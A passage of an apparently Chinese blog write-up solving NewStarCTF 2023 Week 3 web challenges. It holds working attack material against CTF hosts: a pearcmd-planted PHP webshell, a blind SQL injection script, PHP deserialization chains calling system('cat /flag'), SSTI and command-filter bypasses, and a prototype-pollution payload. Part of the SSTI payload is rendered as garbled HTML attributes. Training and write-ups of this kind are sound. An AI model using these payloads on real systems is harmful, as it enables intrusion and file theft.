+</span></code></pre><p>可以发现 env 存在属性 FLAG 值为 <code>fake{Check_register_argc_argv}</code> ，通过查看属性 register_argc_argv 可以发现值为 <code>On</code> 。<blockquote><p>https://cloud.tencent.com/developer/article/2204400</blockquote><p>register_argc_argv 告诉PHP是否声明了 <code>argv</code> 和 <code>argc</code> 变量，这些变量可以是 POST 信息、也可以是 GET 信息，设置为 TRUE 时，能够通过 CLI SAPI 持续读取 argc 变量（传递给应用程序的若干参数）和 argv 变量（实际参数的数组），当我们使用 CLI SAPI 时，PHP变量 argc 和 argv 会自动填充为合适的值，并且可以在SERVER数组中找到这些值，比如 $_SERVER[‘argv’] 。<p>当构造 payload <code>a=a+b+c</code> 的时候，可以通过 <code>var_dump($_SERVER['argv']);</code> 输出 <code>array(1){[0]=>string(3)"a=a" [1]=>string(1)"b" [2]=>string(1)"c"}</code> ，即通过 <code>+</code> 作为分割符。<p>通过构造 payload 如下<pre class=z-code><code><span class="z-text z-plain">file=/usr/local/lib/php/pearcmd&+config-create+/&LT?=@eval($_POST[1])?>+./1.php
+</span></code></pre><p>可以得到回显如下<pre class=z-code><code><span class="z-text z-plain">Successfully created default configuration file "/var/www/html/1.php"
+</span></code></pre><p>通过访问 <code>1.php</code> ，并构造 payload 如下即可得到 flag。<pre class=z-code><code><span class="z-text z-plain">1=system("cat /flag");
+</span></code></pre><h3 id=week-3-medium-sql>[Week 3]medium_sql<a aria-label="Anchor link for: week-3-medium-sql" class=zola-anchor href=#week-3-medium-sql style=visibility:hidden></a></h3><p>根据题目描述可以得出需要进行一些绕过，先查看那些关键词被过滤了。<p>过滤关键词：union、# ，发现回显只有 <code>id not exists</code> 还有 ID 正确时的输出，故尝试布尔注入，经测试 <code>select、or、where、ascii</code> 需要进行大小写绕过。<pre class=z-code><code><span class="z-text z-plain">import requests
+</span><span class="z-text z-plain">import time
+</span><span class="z-text z-plain">
+</span><span class="z-text z-plain">target = "http://c14df6c5-9f87-4cfa-bd7a-9dd3bca93bf4.node4.buuoj.cn:81/"
+</span><span class="z-text z-plain">
+</span><span class="z-text z-plain">
+</span><span class="z-text z-plain">def getDataBase():  # 获取数据库名
+</span><span class="z-text z-plain">    database_name = ""
+</span><span class="z-text z-plain">    for i in range(1, 1000):  # 注意是从1开始，substr函数从第一个字符开始截取
+</span><span class="z-text z-plain">        low = 32
+</span><span class="z-text z-plain">        high = 127
+</span><span class="z-text z-plain">        mid = (low + high) // 2
+</span><span class="z-text z-plain">        while low < high:  # 二分法
+</span><span class="z-text z-plain">            params = {
+</span><span class="z-text z-plain">                "id": "TMP0919' And (Ascii(suBstr((sElect(database()))," + str(i) + ",1))>" + str(mid) + ")%23"
+</span><span class="z-text z-plain">            }
+</span><span class="z-text z-plain">            time.sleep(0.1)
+</span><span class="z-text z-plain">            r = requests.get(url=target+'?id='+params["id"])
+</span><span class="z-text z-plain">            if "Physics" in r.text:  # 为真时说明该字符在ascii表后面一半
+</span><span class="z-text z-plain">                low = mid + 1
+</span><span class="z-text z-plain">            else:
+</span><span class="z-text z-plain">                high = mid
+</span><span class="z-text z-plain">            mid = (low + high) // 2
+</span><span class="z-text z-plain">        if low <= 32 or high >= 127:
+</span><span class="z-text z-plain">            break
+</span><span class="z-text z-plain">        database_name += chr(mid)  # 将ascii码转换为字符
+</span><span class="z-text z-plain">        print(database_name)
+</span><span class="z-text z-plain">    return "数据库名：" + database_name
+</span><span class="z-text z-plain">
+</span><span class="z-text z-plain">
+</span><span class="z-text z-plain">def getTable():  # 获取表名
+</span><span class="z-text z-plain">    column_name = ""
+</span><span class="z-text z-plain">    for i in range(1, 1000):
+</span><span class="z-text z-plain">        low = 32
+</span><span class="z-text z-plain">        high = 127
+</span><span class="z-text z-plain">        mid = (low + high) // 2
+</span><span class="z-text z-plain">        while low < high:
+</span><span class="z-text z-plain">            params = {
+</span><span class="z-text z-plain">                "id": "TMP0919' And (Ascii(suBstr((sElect(group_concat(table_name))from(infOrmation_schema.tables)wHere(table_schema='ctf'))," + str(
+</span><span class="z-text z-plain">                    i) + ",1))>" + str(mid) + ")%23"
+</span><span class="z-text z-plain">            }
+</span><span class="z-text z-plain">            time.sleep(0.1)
+</span><span class="z-text z-plain">            r = requests.get(url=target + '?id=' + params["id"])
+</span><span class="z-text z-plain">            if "Physics" in r.text:
+</span><span class="z-text z-plain">                low = mid + 1
+</span><span class="z-text z-plain">            else:
+</span><span class="z-text z-plain">                high = mid
+</span><span class="z-text z-plain">            mid = (low + high) // 2
+</span><span class="z-text z-plain">        if low <= 32 or high >= 127:
+</span><span class="z-text z-plain">            break
+</span><span class="z-text z-plain">        column_name += chr(mid)
+</span><span class="z-text z-plain">        print(column_name)
+</span><span class="z-text z-plain">    return "表名为：" + column_name
+</span><span class="z-text z-plain">
+</span><span class="z-text z-plain">
+</span><span class="z-text z-plain">def getColumn():  # 获取列名
+</span><span class="z-text z-plain">    column_name = ""
+</span><span class="z-text z-plain">    for i in range(1, 250):
+</span><span class="z-text z-plain">        low = 32
+</span><span class="z-text z-plain">        high = 127
+</span><span class="z-text z-plain">        mid = (low + high) // 2
+</span><span class="z-text z-plain">        while low < high:
+</span><span class="z-text z-plain">            params = {
+</span><span class="z-text z-plain">                "id": "TMP0919' And (Ascii(suBstr((sElect(group_concat(column_name))from(infOrmation_schema.columns)wHere(table_name='here_is_flag'))," + str(
+</span><span class="z-text z-plain">                    i) + ",1))>" + str(mid) + ")%23"
+</span><span class="z-text z-plain">            }
+</span><span class="z-text z-plain">            time.sleep(0.1)
+</span><span class="z-text z-plain">            r = requests.get(url=target + '?id=' + params["id"])
+</span><span class="z-text z-plain">            if 'Physics' in r.text:
+</span><span class="z-text z-plain">                low = mid + 1
+</span><span class="z-text z-plain">            else:
+</span><span class="z-text z-plain">                high = mid
+</span><span class="z-text z-plain">            mid = (low + high) // 2
+</span><span class="z-text z-plain">        if low <= 32 or high >= 127:
+</span><span class="z-text z-plain">            break
+</span><span class="z-text z-plain">        column_name += chr(mid)
+</span><span class="z-text z-plain">        print(column_name)
+</span><span class="z-text z-plain">    return "列名为：" + column_name
+</span><span class="z-text z-plain">
+</span><span class="z-text z-plain">
+</span><span class="z-text z-plain">def getFlag():  # 获取flag
+</span><span class="z-text z-plain">    flag = ""
+</span><span class="z-text z-plain">    for i in range(1, 1000):
+</span><span class="z-text z-plain">        low = 32
+</span><span class="z-text z-plain">        high = 127
+</span><span class="z-text z-plain">        mid = (low + high) // 2
+</span><span class="z-text z-plain">        while low < high:
+</span><span class="z-text z-plain">            params = {
+</span><span class="z-text z-plain">                "id": "TMP0919' And (Ascii(suBstr((sElect(group_concat(flag))from(here_is_flag))," + str(i) + ",1))>" + str(mid) + ")%23"
+</span><span class="z-text z-plain">            }
+</span><span class="z-text z-plain">            time.sleep(0.1)
+</span><span class="z-text z-plain">            r = requests.get(url=target + '?id=' + params["id"])
+</span><span class="z-text z-plain">            if 'Physics' in r.text:
+</span><span class="z-text z-plain">                low = mid + 1
+</span><span class="z-text z-plain">            else:
+</span><span class="z-text z-plain">                high = mid
+</span><span class="z-text z-plain">            mid = (low + high) // 2
+</span><span class="z-text z-plain">        if low <= 32 or high >= 127:
+</span><span class="z-text z-plain">            break
+</span><span class="z-text z-plain">        flag += chr(mid)
+</span><span class="z-text z-plain">        print(flag)
+</span><span class="z-text z-plain">    return "flag:" + flag
+</span><span class="z-text z-plain">
+</span><span class="z-text z-plain">
+</span><span class="z-text z-plain">a = getDataBase()
+</span><span class="z-text z-plain">b = getTable()
+</span><span class="z-text z-plain">c = getColumn()
+</span><span class="z-text z-plain">d = getFlag()
+</span><span class="z-text z-plain">print(a)
+</span><span class="z-text z-plain">print(b)
+</span><span class="z-text z-plain">print(c)
+</span><span class="z-text z-plain">print(d)
+</span></code></pre><h3 id=week-3-pop-gadget>[Week 3]POP Gadget<a aria-label="Anchor link for: week-3-pop-gadget" class=zola-anchor href=#week-3-pop-gadget style=visibility:hidden></a></h3><p>源代码<pre class=z-code><code><span class="z-text z-plain">&LT?php
+</span><span class="z-text z-plain">highlight_file(__FILE__);
+</span><span class="z-text z-plain">
+</span><span class="z-text z-plain">class Begin{
+</span><span class="z-text z-plain">    public $name;
+</span><span class="z-text z-plain">
+</span><span class="z-text z-plain">    public function __destruct()
+</span><span class="z-text z-plain">    {
+</span><span class="z-text z-plain">        if(preg_match("/[a-zA-Z0-9]/",$this->name)){
+</span><span class="z-text z-plain">            echo "Hello";
+</span><span class="z-text z-plain">        }else{
+</span><span class="z-text z-plain">            echo "Welcome to NewStarCTF 2023!";
+</span><span class="z-text z-plain">        }
+</span><span class="z-text z-plain">    }
+</span><span class="z-text z-plain">}
+</span><span class="z-text z-plain">
+</span><span class="z-text z-plain">class Then{
+</span><span class="z-text z-plain">    private $func;
+</span><span class="z-text z-plain">
+</span><span class="z-text z-plain">    public function __toString()
+</span><span class="z-text z-plain">    {
+</span><span class="z-text z-plain">        ($this->func)();
+</span><span class="z-text z-plain">        return "Good Job!";
+</span><span class="z-text z-plain">    }
+</span><span class="z-text z-plain">
+</span><span class="z-text z-plain">}
+</span><span class="z-text z-plain">
+</span><span class="z-text z-plain">class Handle{
+</span><span class="z-text z-plain">    protected $obj;
+</span><span class="z-text z-plain">
+</span><span class="z-text z-plain">    public function __call($func, $vars)
+</span><span class="z-text z-plain">    {
+</span><span class="z-text z-plain">        $this->obj->end();
+</span><span class="z-text z-plain">    }
+</span><span class="z-text z-plain">
+</span><span class="z-text z-plain">}
+</span><span class="z-text z-plain">
+</span><span class="z-text z-plain">class Super{
+</span><span class="z-text z-plain">    protected $obj;
+</span><span class="z-text z-plain">    public function __invoke()
+</span><span class="z-text z-plain">    {
+</span><span class="z-text z-plain">        $this->obj->getStr();
+</span><span class="z-text z-plain">    }
+</span><span class="z-text z-plain">
+</span><span class="z-text z-plain">    public function end()
+</span><span class="z-text z-plain">    {
+</span><span class="z-text z-plain">        die("==GAME OVER==");
+</span><span class="z-text z-plain">    }
+</span><span class="z-text z-plain">}
+</span><span class="z-text z-plain">
+</span><span class="z-text z-plain">class CTF{
+</span><span class="z-text z-plain">    public $handle;
+</span><span class="z-text z-plain">
+</span><span class="z-text z-plain">    public function end()
+</span><span class="z-text z-plain">    {
+</span><span class="z-text z-plain">        unset($this->handle->log);
+</span><span class="z-text z-plain">    }
+</span><span class="z-text z-plain">
+</span><span class="z-text z-plain">}
+</span><span class="z-text z-plain">
+</span><span class="z-text z-plain">class WhiteGod{
+</span><span class="z-text z-plain">    public $func;
+</span><span class="z-text z-plain">    public $var;
+</span><span class="z-text z-plain">
+</span><span class="z-text z-plain">    public function __unset($var)
+</span><span class="z-text z-plain">    {
+</span><span class="z-text z-plain">        ($this->func)($this->var);    
+</span><span class="z-text z-plain">    }
+</span><span class="z-text z-plain">}
+</span><span class="z-text z-plain">
+</span><span class="z-text z-plain">@unserialize($_POST['pop']);
+</span></code></pre><p>POP链如下<pre class=z-code><code><span class="z-text z-plain">Begin::__destruct()->Then::__toString()->Super::__invoke()->Handle::__call($func, $vars)->CTF::end()->WhiteGod::__unset($var)
+</span></code></pre><p>构造 Payload 过程如下<pre class=z-code><code><span class="z-text z-plain">&LT?php
+</span><span class="z-text z-plain">highlight_file(__FILE__);
+</span><span class="z-text z-plain">
+</span><span class="z-text z-plain">class Begin{
+</span><span class="z-text z-plain">    public $name;
+</span><span class="z-text z-plain">
+</span><span class="z-text z-plain">    public function __destruct()
+</span><span class="z-text z-plain">    {
+</span><span class="z-text z-plain">        if(preg_match("/[a-zA-Z0-9]/",$this->name)){
+</span><span class="z-text z-plain">            echo "Hello";
+</span><span class="z-text z-plain">        }else{
+</span><span class="z-text z-plain">            echo "Welcome to NewStarCTF 2023!";
+</span><span class="z-text z-plain">        }
+</span><span class="z-text z-plain">    }
+</span><span class="z-text z-plain">}
+</span><span class="z-text z-plain">
+</span><span class="z-text z-plain">class Then{
+</span><span class="z-text z-plain">    private $func;
+</span><span class="z-text z-plain">
+</span><span class="z-text z-plain">    public function __construct($super)
+</span><span class="z-text z-plain">    {
+</span><span class="z-text z-plain">        $this->func = $super;
+</span><span class="z-text z-plain">    }
+</span><span class="z-text z-plain">
+</span><span class="z-text z-plain">    public function __toString()
+</span><span class="z-text z-plain">    {
+</span><span class="z-text z-plain">        ($this->func)();
+</span><span class="z-text z-plain">        return "Good Job!";
+</span><span class="z-text z-plain">    }
+</span><span class="z-text z-plain">
+</span><span class="z-text z-plain">}
+</span><span class="z-text z-plain">
+</span><span class="z-text z-plain">class Handle{
+</span><span class="z-text z-plain">    protected $obj;
+</span><span class="z-text z-plain">
+</span><span class="z-text z-plain">    public function __construct($ctf)
+</span><span class="z-text z-plain">    {
+</span><span class="z-text z-plain">        $this->obj = $ctf;
+</span><span class="z-text z-plain">    }
+</span><span class="z-text z-plain">
+</span><span class="z-text z-plain">    public function __call($func, $vars)
+</span><span class="z-text z-plain">    {
+</span><span class="z-text z-plain">        $this->obj->end();
+</span><span class="z-text z-plain">    }
+</span><span class="z-text z-plain">
+</span><span class="z-text z-plain">}
+</span><span class="z-text z-plain">
+</span><span class="z-text z-plain">class Super{
+</span><span class="z-text z-plain">    protected $obj;
+</span><span class="z-text z-plain">
+</span><span class="z-text z-plain">    public function __construct($handle)
+</span><span class="z-text z-plain">    {
+</span><span class="z-text z-plain">        $this->obj = $handle;
+</span><span class="z-text z-plain">    }
+</span><span class="z-text z-plain">
+</span><span class="z-text z-plain">    public function __invoke()
+</span><span class="z-text z-plain">    {
+</span><span class="z-text z-plain">        $this->obj->getStr();
+</span><span class="z-text z-plain">    }
+</span><span class="z-text z-plain">
+</span><span class="z-text z-plain">    public function end()
+</span><span class="z-text z-plain">    {
+</span><span class="z-text z-plain">        die("==GAME OVER==");
+</span><span class="z-text z-plain">    }
+</span><span class="z-text z-plain">}
+</span><span class="z-text z-plain">
+</span><span class="z-text z-plain">class CTF{
+</span><span class="z-text z-plain">    public $handle;
+</span><span class="z-text z-plain">
+</span><span class="z-text z-plain">    public function end()
+</span><span class="z-text z-plain">    {
+</span><span class="z-text z-plain">        unset($this->handle->log);
+</span><span class="z-text z-plain">    }
+</span><span class="z-text z-plain">
+</span><span class="z-text z-plain">}
+</span><span class="z-text z-plain">
+</span><span class="z-text z-plain">class WhiteGod{
+</span><span class="z-text z-plain">    public $func;
+</span><span class="z-text z-plain">    public $var;
+</span><span class="z-text z-plain">
+</span><span class="z-text z-plain">    public function __unset($var)
+</span><span class="z-text z-plain">    {
+</span><span class="z-text z-plain">        ($this->func)($this->var);
+</span><span class="z-text z-plain">    }
+</span><span class="z-text z-plain">}
+</span><span class="z-text z-plain">
+</span><span class="z-text z-plain">@unserialize($_POST['pop']);
+</span><span class="z-text z-plain">
+</span><span class="z-text z-plain">$begin = new Begin();
+</span><span class="z-text z-plain">$ctf = new CTF();
+</span><span class="z-text z-plain">$handle = new Handle($ctf);
+</span><span class="z-text z-plain">$super = new Super($handle);
+</span><span class="z-text z-plain">$begin->name = new Then($super);
+</span><span class="z-text z-plain">$ctf->handle = new WhiteGod();
+</span><span class="z-text z-plain">$ctf->handle->func = "system";
+</span><span class="z-text z-plain">$ctf->handle->var = "cat /flag";
+</span><span class="z-text z-plain">
+</span><span class="z-text z-plain">echo urlencode(serialize($begin));
+</span><span class="z-text z-plain">
+</span><span class="z-text z-plain">// O%3A5%3A%22Begin%22%3A1%3A%7Bs%3A4%3A%22name%22%3BO%3A4%3A%22Then%22%3A1%3A%7Bs%3A10%3A%22%00Then%00func%22%3BO%3A5%3A%22Super%22%3A1%3A%7Bs%3A6%3A%22%00%2A%00obj%22%3BO%3A6%3A%22Handle%22%3A1%3A%7Bs%3A6%3A%22%00%2A%00obj%22%3BO%3A3%3A%22CTF%22%3A1%3A%7Bs%3A6%3A%22handle%22%3BO%3A8%3A%22WhiteGod%22%3A2%3A%7Bs%3A4%3A%22func%22%3Bs%3A6%3A%22system%22%3Bs%3A3%3A%22var%22%3Bs%3A9%3A%22cat+%2Fflag%22%3B%7D%7D%7D%7D%7D%7D
+</span></code></pre><h3 id=week-3-genshin>[Week 3]GenShin<a aria-label="Anchor link for: week-3-genshin" class=zola-anchor href=#week-3-genshin style=visibility:hidden></a></h3><p>通过查看 Network - Headers 可以发现 Pop 属性值为 <code>/secr3tofpop</code> ，通过访问可以得到回显如下<pre class=z-code><code><span class="z-text z-plain">please give a name by get
+</span></code></pre><p>通过构造 Payload 如下<pre class=z-code><code><span class="z-text z-plain">name=123
+</span></code></pre><p>可以得到回显如下<pre class=z-code><code><span class="z-text z-plain">Welcome to NewstarCTF 2023 123
+</span></code></pre><p>猜测应该是 Python 的 SSTI 注入，通过构造 Payload 如下<pre class=z-code><code><span class="z-text z-plain">name={{7*7}}
+</span></code></pre><p>得到回显如下<pre class=z-code><code><span class="z-text z-plain">big hacker!get away from me!
+</span></code></pre><p>尝试另外一种 Payload 如下<pre class=z-code><code><span class="z-text z-plain">name=&LTdiv data-gb-custom-block data-tag="print" data-0='7' data-1='7' data-2='7' data-3='7'>&LT/div>
+</span></code></pre><p>可以得到回显如下<pre class=z-code><code><span class="z-text z-plain">Welcome to NewstarCTF 2023 49
+</span></code></pre><p>故判断可以通过此方法继续进行 SSTI 注入，通过尝试各种关键字可以发现 <code>单引号, init, lipsum, url_for, 反斜杠, popen</code> 被过滤了。<p>通过构造 Payload 如下<pre class=z-code><code><span class="z-text z-plain">name=
+</span><span class="z-text z-plain">
+</span><span class="z-text z-plain">&LTdiv data-gb-custom-block data-tag="print" data-0=''>&LT/div>
+</span></code></pre><p>可以输出所有的子类，被过滤的关键字可以通过 <code>|attr()</code> 进行绕过，由于直接使用 eval 无法使用 chr 函数，因此需要通过在里面多套一层 eval 来实现，由于已经存在单双引号了，所以就直接全用 chr 函数来实现注入吧，生成脚本如下<pre class=z-code><code><span class="z-text z-plain">string = "__import__('os').popen('cat /flag').read()"
+</span><span class="z-text z-plain">output = ""
+</span><span class="z-text z-plain">
+</span><span class="z-text z-plain">for char in string:
+</span><span class="z-text z-plain">    output += f"chr({ord(char)})%2b"
+</span><span class="z-text z-plain">
+</span><span class="z-text z-plain">print(output)
+</span><span class="z-text z-plain">"""
+</span><span class="z-text z-plain">chr(95)%2bchr(95)%2bchr(105)%2bchr(109)%2bchr(112)%2bchr(111)%2bchr(114)%2bchr(116)%2bchr(95)%2bchr(95)%2bchr(40)%2bchr(39)%2bchr(111)%2bchr(115)%2bchr(39)%2bchr(41)%2bchr(46)%2bchr(112)%2bchr(111)%2bchr(112)%2bchr(101)%2bchr(110)%2bchr(40)%2bchr(39)%2bchr(99)%2bchr(97)%2bchr(116)%2bchr(32)%2bchr(47)%2bchr(102)%2bchr(108)%2bchr(97)%2bchr(103)%2bchr(39)%2bchr(41)%2bchr(46)%2bchr(114)%2bchr(101)%2bchr(97)%2bchr(100)%2bchr(40)%2bchr(41)
+</span><span class="z-text z-plain">"""
+</span></code></pre><p>构造 Payload 如下<pre class=z-code><code><span class="z-text z-plain">name=
+</span><span class="z-text z-plain">
+</span><span class="z-text z-plain">&LTdiv data-gb-custom-block data-tag="print" data-0='' data-1='' data-2='132' data-3='132' data-4='132' data-5='132' data-6='132' data-7='132' data-8='132' data-9='132' data-10='132' data-11='132' data-12='132' data-13='132' data-14='132' data-15='2' data-16='__in' data-17='__in' data-18='+' data-19=')|attr(' data-20='__globals__' data-21='))[' data-22='__builtins__' data-23='].eval(' data-24='95' data-25='95' data-26='95' data-27='95' data-28='95' data-29='5' data-30='2' data-31='2' data-32='2' data-33='95' data-34='95' data-35='95' data-36='5' data-37='2' data-38='2' data-39='2' data-40='105' data-41='105' data-42='5' data-43='2' data-44='2' data-45='2' data-46='109' data-47='109' data-48='9' data-49='2' data-50='2' data-51='2' data-52='112' data-53='112' data-54='12' data-55='2' data-56='2' data-57='2' data-58='111' data-59='111' data-60='11' data-61='2' data-62='2' data-63='2' data-64='114' data-65='114' data-66='14' data-67='2' data-68='2' data-69='2' data-70='116' data-71='116' data-72='16' data-73='2' data-74='2' data-75='2' data-76='95' data-77='95' data-78='95' data-79='5' data-80='2' data-81='2' data-82='2' data-83='95' data-84='95' data-85='95' data-86='5' data-87='2' data-88='2' data-89='2' data-90='40' data-91='40' data-92='40' data-93='0' data-94='2' data-95='2' data-96='2' data-97='39' data-98='39' data-99='39' data-100='9' data-101='2' data-102='2' data-103='2' data-104='111' data-105='111' data-106='11' data-107='2' data-108='2' data-109='2' data-110='115' data-111='115' data-112='15' data-113='2' data-114='2' data-115='2' data-116='39' data-117='39' data-118='39' data-119='9' data-120='2' data-121='2' data-122='2' data-123='41' data-124='41' data-125='41' data-126='1' data-127='2' data-128='2' data-129='2' data-130='46' data-131='46' data-132='46' data-133='6' data-134='2' data-135='2' data-136='2' data-137='112' data-138='112' data-139='12' data-140='2' data-141='2' data-142='2' data-143='111' data-144='111' data-145='11' data-146='2' data-147='2' data-148='2' data-149='112' data-150='112' data-151='12' data-152='2' data-153='2' data-154='2' data-155='101' data-156='101' data-157='1' data-158='2' data-159='2' data-160='2' data-161='110' data-162='110' data-163='10' data-164='2' data-165='2' data-166='2' data-167='40' data-168='40' data-169='40' data-170='0' data-171='2' data-172='2' data-173='2' data-174='39' data-175='39' data-176='39' data-177='9' data-178='2' data-179='2' data-180='2' data-181='99' data-182='99' data-183='99' data-184='9' data-185='2' data-186='2' data-187='2' data-188='97' data-189='97' data-190='97' data-191='7' data-192='2' data-193='2' data-194='2' data-195='116' data-196='116' data-197='16' data-198='2' data-199='2' data-200='2' data-201='32' data-202='32' data-203='32' data-204='2' data-205='2' data-206='2' data-207='2' data-208='47' data-209='47' data-210='47' data-211='7' data-212='2' data-213='2' data-214='2' data-215='102' data-216='102' data-217='2' data-218='2' data-219='2' data-220='2' data-221='108' data-222='108' data-223='8' data-224='2' data-225='2' data-226='2' data-227='97' data-228='97' data-229='97' data-230='7' data-231='2' data-232='2' data-233='2' data-234='103' data-235='103' data-236='3' data-237='2' data-238='2' data-239='2' data-240='39' data-241='39' data-242='39' data-243='9' data-244='2' data-245='2' data-246='2' data-247='41' data-248='41' data-249='41' data-250='1' data-251='2' data-252='2' data-253='2' data-254='46' data-255='46' data-256='46' data-257='6' data-258='2' data-259='2' data-260='2' data-261='114' data-262='114' data-263='14' data-264='2' data-265='2' data-266='2' data-267='101' data-268='101' data-269='1' data-270='2' data-271='2' data-272='2' data-273='97' data-274='97' data-275='97' data-276='7' data-277='2' data-278='2' data-279='2' data-280='100' data-281='100' data-282='0' data-283='2' data-284='2' data-285='2' data-286='40' data-287='40' data-288='40' data-289='0' data-290='2' data-291='2' data-292='2' data-293='41' data-294='41' data-295='41' data-296='1'>&LT/div>
+</span></code></pre><p>即可得到 flag。<h3 id=week-3-r-c-e>[Week 3]R!!!C!!!E!!!<a aria-label="Anchor link for: week-3-r-c-e" class=zola-anchor href=#week-3-r-c-e style=visibility:hidden></a></h3><p>源代码如下<pre class=z-code><code><span class="z-text z-plain">&LT?php
+</span><span class="z-text z-plain">highlight_file(__FILE__);
+</span><span class="z-text z-plain">class minipop{
+</span><span class="z-text z-plain">    public $code;
+</span><span class="z-text z-plain">    public $qwejaskdjnlka;
+</span><span class="z-text z-plain">    public function __toString()
+</span><span class="z-text z-plain">    {
+</span><span class="z-text z-plain">        if(!preg_match('/\\$|\.|\!|\@|\#|\%|\^|\&|\*|\?|\{|\}|\>|\<|nc|tee|wget|exec|bash|sh|netcat|grep|base64|rev|curl|wget|gcc|php|python|pingtouch|mv|mkdir|cp/i', $this->code)){
+</span><span class="z-text z-plain">            exec($this->code);
+</span><span class="z-text z-plain">        }
+</span><span class="z-text z-plain">        return "alright";
+</span><span class="z-text z-plain">    }
+</span><span class="z-text z-plain">    public function __destruct()
+</span><span class="z-text z-plain">    {
+</span><span class="z-text z-plain">        echo $this->qwejaskdjnlka;
+</span><span class="z-text z-plain">    }
+</span><span class="z-text z-plain">}
+</span><span class="z-text z-plain">if(isset($_POST['payload'])){
+</span><span class="z-text z-plain">    //wanna try?
+</span><span class="z-text z-plain">    unserialize($_POST['payload']);
+</span><span class="z-text z-plain">}
+</span></code></pre><p>通过 exec 方法可以执行系统命令，因此这题也考的是 Linux 的命令绕过。<p>由于引号没有进行绕过，所以可以通过引号进行关键字的绕过，构造 Payload 过程如下<pre class=z-code><code><span class="z-text z-plain">&LT?php
+</span><span class="z-text z-plain">highlight_file(__FILE__);
+</span><span class="z-text z-plain">class minipop{
+</span><span class="z-text z-plain">    public $code;
+</span><span class="z-text z-plain">    public $qwejaskdjnlka;
+</span><span class="z-text z-plain">    public function __toString()
+</span><span class="z-text z-plain">    {
+</span><span class="z-text z-plain">        if(!preg_match('/\\$|\.|\!|\@|\#|\%|\^|\&|\*|\?|\{|\}|\>|\<|nc|tee|wget|exec|bash|sh|netcat|grep|base64|rev|curl|wget|gcc|php|python|pingtouch|mv|mkdir|cp/i', $this->code)){
+</span><span class="z-text z-plain">            exec($this->code);
+</span><span class="z-text z-plain">        }
+</span><span class="z-text z-plain">        return "alright";
+</span><span class="z-text z-plain">    }
+</span><span class="z-text z-plain">    public function __destruct()
+</span><span class="z-text z-plain">    {
+</span><span class="z-text z-plain">        echo $this->qwejaskdjnlka;
+</span><span class="z-text z-plain">    }
+</span><span class="z-text z-plain">}
+</span><span class="z-text z-plain">if(isset($_POST['payload'])){
+</span><span class="z-text z-plain">    //wanna try?
+</span><span class="z-text z-plain">    unserialize($_POST['payload']);
+</span><span class="z-text z-plain">}
+</span><span class="z-text z-plain">
+</span><span class="z-text z-plain">$pop = new minipop();
+</span><span class="z-text z-plain">$pop->qwejaskdjnlka = new minipop();
+</span><span class="z-text z-plain">$pop->qwejaskdjnlka->code = "cat /flag_is_h3eeere | t''ee 2";
+</span><span class="z-text z-plain">
+</span><span class="z-text z-plain">echo serialize($pop);
+</span><span class="z-text z-plain">// O:7:"minipop":2:{s:4:"code";N;s:13:"qwejaskdjnlka";O:7:"minipop":2:{s:4:"code";s:30:"cat /flag_is_h3eeere | t''ee 2";s:13:"qwejaskdjnlka";N;}}
+</span></code></pre><p>即可得到 flag。<h3 id=week-3-otenkigirl>[Week 3]OtenkiGirl<a aria-label="Anchor link for: week-3-otenkigirl" class=zola-anchor href=#week-3-otenkigirl style=visibility:hidden></a></h3><p>源代码中存在 <code>hint.txt</code> 内容如下<pre class=z-code><code><span class="z-text z-plain">『「routes」フォルダーだけを見てください。SQLインジェクションはありません。』と御坂御坂は期待に満ちた気持ちで言った。
+</span><span class="z-text z-plain">---
+</span><span class="z-text z-plain">“请只看‘routes’文件夹。没有SQL注入。”御坂御坂满怀期待地说。
+</span></code></pre><p>在 <code>routes/info.js</code> 可以发现该路由用于根据所给的 timestamp 输出该时间戳之后的所有内容。<pre class=z-code><code><span class="z-text z-plain">async function getInfo(timestamp) {
+</span><span class="z-text z-plain">    timestamp = typeof timestamp === "number" ? timestamp : Date.now();
+</span><span class="z-text z-plain">    // Remove test data from before the movie was released
+</span><span class="z-text z-plain">    let minTimestamp = new Date(CONFIG.min_public_time || DEFAULT_CONFIG.min_public_time).getTime();
+</span><span class="z-text z-plain">    timestamp = Math.max(timestamp, minTimestamp);
+</span><span class="z-text z-plain">    const data = await sql.all(`SELECT wishid, date, place, contact, reason, timestamp FROM wishes WHERE timestamp >= ?`, [timestamp]).catch(e => { throw e });
+</span><span class="z-text z-plain">    return data;
+</span><span class="z-text z-plain">}
+</span></code></pre><p>在输入 timestamp 后，上述方法会将所输入的 timestamp 与 min_public_time 进行对比，其中 <code>CONFIG.min_public_time</code> 值不存在，<code>DEFAULT_CONFIG.min_public_time</code> 值为 <code>2019-07-09</code> ，因此需要通过污染 <code>min_public_time</code> 属性才能使其输出 2019-07-09 之前的数据。<p>minTimestamp 首先会从 <code>CONFIG</code> 中获取 <code>min_public_time</code> ，获取失败后继续再从 <code>DEFAULT_CONFIG</code> 中获取，二者的原型对象都是 <code>Object</code> 。<p>在 <code>routes/submit.js</code> 中可以发现原型链污染点：<pre class=z-code><code><span class="z-text z-plain">// L39
+</span><span class="z-text z-plain">const merge = (dst, src) => {
+</span><span class="z-text z-plain">    if (typeof dst !== "object" || typeof src !== "object") return dst;
+</span><span class="z-text z-plain">    for (let key in src) {
+</span><span class="z-text z-plain">        if (key in dst && key in src) {
+</span><span class="z-text z-plain">            dst[key] = merge(dst[key], src[key]);
+</span><span class="z-text z-plain">        } else {
+</span><span class="z-text z-plain">            dst[key] = src[key];
+</span><span class="z-text z-plain">        }
+</span><span class="z-text z-plain">    }
+</span><span class="z-text z-plain">    return dst;
+</span><span class="z-text z-plain">}
+</span><span class="z-text z-plain">
+</span><span class="z-text z-plain">// L73
+</span><span class="z-text z-plain">const DEFAULT = {
+</span><span class="z-text z-plain">    date: "unknown",
+</span><span class="z-text z-plain">    place: "unknown"
+</span><span class="z-text z-plain">}
+</span><span class="z-text z-plain">const result = await insert2db(merge(DEFAULT, data));
+</span></code></pre><p>在上述代码中，<code>data</code> 的值是可控的，能够通过 POST 请求传入。<code>DEFAULT</code> 的原型对象也是 <code>Object</code> ，因此可以通过 submit 路由来进行污染攻击。<p>构造 Payload 如下<pre class=z-code><code><span class="z-text z-plain">{
+</span><span class="z-text z-plain">    "contact":"a's'd",
+</span><span class="z-text z-plain">    "reason":"a'd's",
+</span><span class="z-text z-plain">    "__proto__": {
+</span><span class="z-text z-plain">        "min_public_time":  "1970-01-01"
+</span><span class="z-text z-plain">    }
+</span><span class="z-text z-plain">}
+</span></code></pre><p>通过访问 <code>/info/0</code> 可以得到回显得到 flag 。<pre class=z-code><code><span class="z-text z-plain">{
+</span><span class="z-text z-plain">    status: "success",
+</span><span class="z-text z-plain">    data: [
+</span><span class="z-text z-plain">        ...,
+</span><span class="z-text z-plain">        {
